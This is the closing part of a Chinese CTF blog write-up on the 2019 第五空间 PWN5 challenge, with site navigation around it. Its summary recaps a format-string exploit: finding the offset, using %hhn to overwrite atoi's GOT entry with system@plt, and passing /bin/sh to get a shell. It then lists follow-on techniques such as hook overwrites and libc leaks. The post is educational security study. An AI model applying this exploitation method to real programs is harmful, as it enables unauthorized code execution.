+<div class="note success flat"><p><strong>一条原则</strong>：格式串是“代码”，用户输入是“数据”。<strong>把数据放进格式串的位置，就等于让用户写代码。</strong></p>
+</div>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题把格式化字符串从“读”到“写”完整走了一遍：</p>
+<ul>
+<li><strong><code>printf(buf)</code> 是漏洞点</strong>：没有给 printf 传参数，它就会去栈上&#x2F;寄存器里找；</li>
+<li><strong>偏移要用脚本测</strong>：本题是 10，<code>AAAA.%p...</code> 加分隔符是最稳的测法；</li>
+<li><strong><code>%p</code> 读值、<code>%s</code> 读内存、<code>%n</code> 写内存</strong>：三个占位符分别对应泄漏、解引用、写入；</li>
+<li><strong><code>%hhn</code> 适合写 GOT</strong>：一次写 1 字节，避免打印上亿个字符；</li>
+<li><strong>Partial RELRO 让 GOT 可写</strong>：<code>atoi@got</code> → <code>system@plt</code>，下次调用 <code>atoi</code> 就变成 <code>system</code>；</li>
+<li><strong>两次输入各有分工</strong>：第一次写 GOT，第二次给 <code>system</code> 传 <code>/bin/sh</code>；</li>
+<li><strong>shell 在条件判断里出现</strong>：<code>atoi(nptr)</code> 被替换成 <code>system(nptr)</code>，不等 <code>if</code> 体执行就能拿 shell；</li>
+<li><strong>另一条路是泄漏随机数</strong>：用 <code>%s</code> 读 <code>0x804C044</code>，但要处理空字节；</li>
+<li><strong>保护要看对象</strong>：Canary 和 NX 挡不住格式化字符串，Partial RELRO 反而给了 GOT 劫持的机会。</li>
+</ul>
+<p>下一题可以往这几个方向走：</p>
+<table>
+<thead>
+<tr>
+<th>方向</th>
+<th>要解决的问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>64 位格式化字符串</td>
+<td>前 6 个参数在寄存器，偏移和栈布局不同</td>
+</tr>
+<tr>
+<td>Full RELRO</td>
+<td>GOT 只读，改打 <code>__malloc_hook</code> &#x2F; <code>__free_hook</code> 或返回地址</td>
+</tr>
+<tr>
+<td>泄漏 libc</td>
+<td>用 <code>%s</code> 读 GOT 里的 libc 地址，算基址后 ret2libc</td>
+</tr>
+<tr>
+<td>格式化字符串 + 栈溢出</td>
+<td>先用 <code>%n</code> 改返回地址，再触发溢出</td>
+</tr>
+<tr>
+<td>无 <code>system@plt</code></td>
+<td>泄漏 libc，找 <code>system</code> 和 <code>/bin/sh</code></td>
+</tr>
+<tr>
+<td>格式化字符串写任意地址</td>
+<td>多字节写、地址对齐、计数绕回</td>
+</tr>
+</tbody></table>
+<div class="note success flat"><p><strong>一条经验</strong>：格式化字符串题先做三件事——<strong>测偏移、找可写目标、确认保护</strong>。偏移决定 <code>%N$</code> 里的 N，可写目标决定改哪里（GOT、返回地址、hook），保护决定能不能改（RELRO）。这三件事定了，payload 只是算术。</p>
+</div>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Quellisya">Quellisya</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://quellisya.github.io/2026/11/17/pwn-ctf-format-string-pwn5/">https://quellisya.github.io/2026/11/17/pwn-ctf-format-string-pwn5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Quellisya.github.io" target="_blank">Quellisya's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a><a class="post-meta__tags" href="/tags/GOT/">GOT</a><a class="post-meta__tags" href="/tags/PLT/">PLT</a><a class="post-meta__tags" href="/tags/fmtstr-payload/">fmtstr_payload</a><a class="post-meta__tags" href="/tags/pwntools/">pwntools</a><a class="post-meta__tags" href="/tags/IDA/">IDA</a><a class="post-meta__tags" href="/tags/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019/">第五空间2019</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar-seal.svg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/" title="Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾</div></div><div class="info-2"><div class="info-item-1">这道题把 32 位 ret2text 的完整链路走了一遍：get_secret 只把 flag 读进全局变量、不打印，所以要在栈上手工搭出 get_secret → printf(flag) → exit 的假调用栈。重点讲清楚 45 字节偏移怎么从 sub esp,0x3c 和 v4 的 esp+0xf 算出来、cdecl 的参数位置、为什么必须用 exit 收尾，以及 gdb 里 telescope 看到的栈布局。</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/11/06/pwn-ctf-ciscn-2019-n-1/" title="Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-06</div><div class="info-item-2">Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证</div></div><div class="info-2"><div class="info-item-1">从 file / checksec 到 IDA 伪代码，讲清楚这题为什么不打返回地址而是改写相邻的 float v2：44 字节偏移怎么算、11.28125 为什么在内存里是 00 80 34 41、struct.pack('<f', ...) 和 p32(0x41348000) 是什么关系，最后用 pwntools 的 gdb.debug 单步到 gets 之后，在 xmm0 和栈上确认 payload 真的覆盖成功。</div></div></div></a><a class="pagination-related" href="/2026/11/02/pwn-ctf-rip/" title="Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-02</div><div class="info-item-2">Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell</div></div><div class="info-2"><div class="info-item-1">从零把 pwn 环境搭好（gdb、pwndbg、pwntools、ROPgadget、one_gadget），再用 BUUCTF rip 走完第一道栈溢出：找后门、算偏移、处理栈对齐、写 exp 拿 shell。</div></div></div></a><a class="pagination-related" href="/2026/11/05/pwn-ctf-warmup-csaw-2016/" title="Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-05</div><div class="info-item-2">Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐</div></div><div class="info-2"><div class="info-item-1">从 stripped 的 ELF 入手，讲清楚 file / checksec 到底在看什么、没有符号表时怎么在 gdb 里定位 main、gets 写进 v5 时偏移为什么是 72 而不是 128+8，以及 64 位栈对齐的两种绕法：跳到 0x40060e 跳过 push rbp，或者用 ret gadget 再压一次栈。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar-seal.svg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Quellisya</div><div class="author-info-description">记录 CTF 与 Web 安全的学习笔记，把每一步讲清楚。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">103</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Quellisya" target="_blank" title="Github"><i class="fab fa-github" style="color: #0f2f32;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">循墨迹读代码，借微光见漏洞。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E9%81%93%E9%A2%98%E5%9C%A8%E8%80%83%E4%BB%80%E4%B9%88"><span class="toc-text">这道题在考什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9Afile-%E4%B8%8E-checksec"><span class="toc-text">第一步：file 与 checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9AIDA-%E7%9C%8B-main"><span class="toc-text">第二步：IDA 看 main</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%89%BE%E5%81%8F%E7%A7%BB"><span class="toc-text">第三步：找偏移</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E7%9C%8B%E6%A0%88%E5%B8%83%E5%B1%80"><span class="toc-text">先看栈布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E5%81%8F%E7%A7%BB%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-text">测偏移的脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9AGOT-%E8%A1%A8%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%94%B9"><span class="toc-text">第四步：GOT 表是什么，为什么能改</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GOT-%E5%92%8C-PLT"><span class="toc-text">GOT 和 PLT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%EF%BC%88Lazy-Binding%EF%BC%89"><span class="toc-text">延迟绑定（Lazy Binding）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO-%E6%84%8F%E5%91%B3%E7%9D%80%E4%BB%80%E4%B9%88"><span class="toc-text">Partial RELRO 意味着什么</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%89%BE-atoi-got-%E5%92%8C-system-plt"><span class="toc-text">第五步：找 atoi@got 和 system@plt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-pwntools-%E6%8B%BF%E5%9C%B0%E5%9D%80"><span class="toc-text">用 pwntools 拿地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%94%A8-fmtstr-payload-%E5%86%99-GOT"><span class="toc-text">第六步：用 fmtstr_payload 写 GOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8-hhn-%E8%80%8C%E4%B8%8D%E6%98%AF-n"><span class="toc-text">为什么用 %hhn 而不是 %n</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-API-%E4%B8%80%E8%A1%8C%E6%90%9E%E5%AE%9A"><span class="toc-text">用 API 一行搞定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4-exp"><span class="toc-text">完整 exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%9E%84%E9%80%A0-payload%EF%BC%88%E7%90%86%E8%A7%A3-fmtstr-payload%EF%BC%89"><span class="toc-text">第七步：手动构造 payload（理解 fmtstr_payload）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E5%AD%97%E8%8A%82"><span class="toc-text">目标字节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E5%BA%8F"><span class="toc-text">排序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BE%E5%9C%B0%E5%9D%80"><span class="toc-text">放地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E8%AE%A1%E6%95%B0"><span class="toc-text">验证计数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E6%AD%A5%EF%BC%9A%E6%89%93%E8%BF%9C%E7%A8%8B%EF%BC%8C%E6%8B%BF-shell"><span class="toc-text">第八步：打远程，拿 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-shell-%E5%9C%A8-if-%E4%B9%8B%E5%89%8D%E5%B0%B1%E5%87%BA%E7%8E%B0%E4%BA%86"><span class="toc-text">为什么 shell 在 if 之前就出现了</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E6%9D%A1%E8%B7%AF%EF%BC%9A%E6%B3%84%E6%BC%8F%E9%9A%8F%E6%9C%BA%E6%95%B0"><span class="toc-text">另一条路：泄漏随机数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E6%9D%A1%E8%B7%AF%E5%BE%84%E6%9C%89%E5%9D%91"><span class="toc-text">为什么这条路径有坑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E5%85%85"><span class="toc-text">知识点补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B8%B8%E7%94%A8%E5%8D%A0%E4%BD%8D%E7%AC%A6"><span class="toc-text">1. 格式化字符串的常用占位符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-32-%E4%BD%8D%E5%92%8C-64-%E4%BD%8D%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">2. 32 位和 64 位的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-n-%E5%88%B0%E5%BA%95%E5%86%99%E4%BA%86%E4%BB%80%E4%B9%88"><span class="toc-text">3. %n 到底写了什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-GOT%E3%80%81PLT-%E4%B8%8E%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="toc-text">4. GOT、PLT 与延迟绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%99-system-plt-%E8%80%8C%E4%B8%8D%E6%98%AF-system-got"><span class="toc-text">5. 为什么写 system@plt 而不是 system@got</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%80%89-atoi"><span class="toc-text">6. 为什么选 atoi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%B8%BA%E4%BB%80%E4%B9%88-printf-%E5%92%8C-atoi-%E7%9A%84%E8%B0%83%E7%94%A8%E9%A1%BA%E5%BA%8F%E5%BE%88%E9%87%8D%E8%A6%81"><span class="toc-text">7. 为什么 printf 和 atoi 的调用顺序很重要</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-fmtstr-payload-%E7%9A%84-offset-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">8. fmtstr_payload 的 offset 是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-Canary%E3%80%81NX%E3%80%81PIE%E3%80%81RELRO-%E5%9C%A8%E8%BF%99%E9%A2%98%E9%87%8C%E7%9A%84%E8%A7%92%E8%89%B2"><span class="toc-text">9. Canary、NX、PIE、RELRO 在这题里的角色</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-text">新手常见问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E9%80%9F%E6%9F%A5"><span class="toc-text">完整流程速查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%BA%E6%89%8B%E8%81%8A%E8%81%8A%E6%80%8E%E4%B9%88%E9%98%B2"><span class="toc-text">顺手聊聊怎么防</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/17/pwn-ctf-format-string-pwn5/" title="Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system">Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system</a><time datetime="2026-11-17T02:00:00.000Z" title="发表于 2026-11-17 10:00:00">2026-11-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/" title="Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾">Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾</a><time datetime="2026-11-14T07:00:00.000Z" title="发表于 2026-11-14 15:00:00">2026-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/14/web-ctf-http-geek2019/" title="[极客大挑战 2019] Http：Referer、User-Agent、X-Forwarded-For，以及被反向代理吞掉的那一步">[极客大挑战 2019] Http：Referer、User-Agent、X-Forwarded-For，以及被反向代理吞掉的那一步</a><time datetime="2026-11-14T03:00:00.000Z" title="发表于 2026-11-14 11:00:00">2026-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/14/web-knowledge-php-common-vulns/" title="PHP 常见漏洞笔记：数组报错绕过、Cookie 信任与 php://filter 读源码">PHP 常见漏洞笔记：数组报错绕过、Cookie 信任与 php://filter 读源码</a><time datetime="2026-11-14T01:00:00.000Z" title="发表于 2026-11-14 09:00:00">2026-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/12/web-ctf-sql-bool-blind/" title="[CISCN2019 华北赛区 Day2 Web1] Hack World：空格被过滤后的布尔盲注与二分查找">[CISCN2019 华北赛区 Day2 Web1] Hack World：空格被过滤后的布尔盲注与二分查找</a><time datetime="2026-11-12T02:00:00.000Z" title="发表于 2026-11-12 10:00:00">2026-11-12</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Quellisya</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div><div class="footer_custom_text">以墨为舟，以码为桨 · CTF & Web Security Notes</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script defer src="/js/butterfly-custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索笔记、题目或 payload…" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.0"></script></div></div></body></html>
